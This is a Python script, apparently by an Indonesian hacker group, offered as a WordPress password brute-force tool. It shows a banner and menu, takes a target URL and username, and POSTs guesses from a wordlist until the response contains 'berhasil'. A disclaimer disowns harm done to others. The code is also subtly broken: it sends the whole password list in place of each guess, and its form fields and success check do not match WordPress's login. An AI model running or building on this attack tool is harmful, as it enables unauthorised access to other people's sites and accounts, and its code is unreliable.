#!/usr/bin/python3
#simple bruteforcing tools for wordpress
# Copyright (c) 2018 - 2021 Cantix Crew Ladies Haxor
#Riska - Mega - Dhea - Chindy - Feby - Talia - Sisilia
#tweet: @nenghaxor
#Note: segala tindakan yang merugikan orang lain diluar tanggung jawab author!

import sys
## read README.md for complete installation this tools
if sys.version_info[0] < 3:
    print("\nPython3 is needed to run Prestix, Try \"python3 prestix.py\" instead\n")
    sys.exit(2)
    
import os
import time
import requests
import multiprocessing

#####color#####
wh = "\033[97m"
yel = "\033[93m"
orge = "\033[38;5;208m"
fg = "\033[32m"
red    = "\033[91m"
cy = "\033[36m";
bold   = "\033[1m";

#####################
##### main area #####
#####################

def main():
	os.system ('clear')
	print(cy + "\n  /$$$$$$$                                 /$$     /$$           ")
	print("  | $$__  $$                               | $$    |__/           ")
	print("  | $$  \ $$ /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$   /$$ /$$   /$$ ")
	print("  | $$$$$$$//$$__  $$ /$$__  $$ /$$_____/|_  $$_/  | $$|  $$ /$$/ ")
	print("  | $$____/| $$  \__/| $$$$$$$$|  $$$$$$   | $$    | $$ \  $$$$/  ")
	print("  | $$     | $$      | $$_____/ \____  $$  | $$ /$$| $$  >$$  $$  ")
	print("  | $$     | $$      |  $$$$$$$ /$$$$$$$/  |  $$$$/| $$ /$$/\  $$ ")
	print("  |__/     |__/       \_______/|_______/    \___/  |__/|__/  \__/ ")
	print(wh + "           wordpress bruteforce v.2.0" + orge + " @cantixcrew          \n")
	print(cy + " [" + orge + "1" + cy + "]" + wh + " Single Target")
	print(cy + " [" + orge + "2" + cy + "]" + wh + " Multiple List (coming soon)")
	print(cy + " [" + orge + "3" + cy + "]" + wh + " exit.")
	rere = input(' root@cantix~: ' + orge)
	if rere == '1':
		single()
	elif rere == '2':
		print(cy + " [" + orge + "*" + cy + "]" + wh + " whoops..this fitur coming soon guys")
		time.sleep(2)
		main()
	elif rere == '3':
		sys.exit()
	else:
		print(red + "[!]" + orge + " damn,invalid command")
		time.sleep(2)
		main()
		
def single(): #single bruteforce
	url = input(wh + ' [*] target: ' + orge)
	user = input(wh + ' [+] username : ' + orge)
	os.system('clear')
	banner()
	print(cy + ' -----start bruteforcing-----')
	password = open('data/pass.txt', 'r').readlines()
	for i in password:
		pw = i.strip()
		http = requests.post(url, data={'username':user, 'password':password, 'submit':'submit'})
		xa = http.content
		if 'berhasil' in str(xa):
			print(wh + " [+] password found" + fg + pw)
			print("  [*] " + url + user + ' --> ' + password)
			break
		else:
			print(wh + " " + url + ' ' + red + user + cy + ' --> ' + red + pw)
			time.sleep(0.5)
			
			
def banner():
	print(cy + "\n  /$$$$$$$                                 /$$     /$$           ")
	print("  | $$__  $$                               | $$    |__/           ")
	print("  | $$  \ $$ /$$$$$$   /$$$$$$   /$$$$$$$ /$$$$$$   /$$ /$$   /$$ ")
	print("  | $$$$$$$//$$__  $$ /$$__  $$ /$$_____/|_  $$_/  | $$|  $$ /$$/ ")
	print("  | $$____/| $$  \__/| $$$$$$$$|  $$$$$$   | $$    | $$ \  $$$$/  ")
	print("  | $$     | $$      | $$_____/ \____  $$  | $$ /$$| $$  >$$  $$  ")
	print("  | $$     | $$      |  $$$$$$$ /$$$$$$$/  |  $$$$/| $$ /$$/\  $$ ")
	print("  |__/     |__/       \_______/|_______/    \___/  |__/|__/  \__/ ")
	print(wh + "           wordpress bruteforce v.2.0" + orge + " @cantixcrew          \n")
	
main()